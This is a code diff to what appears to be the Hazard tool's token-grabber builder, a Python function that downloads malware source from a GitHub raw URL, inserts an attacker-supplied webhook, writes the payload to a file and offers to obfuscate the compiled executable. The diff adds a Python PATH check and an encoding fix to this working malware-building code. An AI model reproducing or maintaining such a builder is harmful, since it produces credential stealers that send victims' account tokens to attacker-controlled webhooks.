@@ -17,6 +17,9 @@ from colorama import Fore
 from util.plugins.common import setTitle, installPackage
 
 def TokenGrabberV2(WebHook, fileName):
+    if os.getenv("Path").count("\\Python\\Python") != 2:
+        input(Fore.RED+'Error!'+Fore.RESET+' You do not have Python installed/added to path! (Or have multiple versions of Python installed)\nPlease delete any existing installations of Python and install the latest version, make sure to click "Add to PATH" too!\n(From https://python.org)')
+        Hazard.main()
     required = [
         'requests',
         'psutil',
@@ -27,7 +30,7 @@ def TokenGrabberV2(WebHook, fileName):
     ]
     installPackage(required)
     code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", WebHook)
-    with open(f"{fileName}.py", 'w', errors="ignore") as f:
+    with open(f"{fileName}.py", 'w', encoding='utf8', errors="ignore") as f:
         f.write(code)
 
     print(f"Do you want to obfuscate {fileName}.exe?")
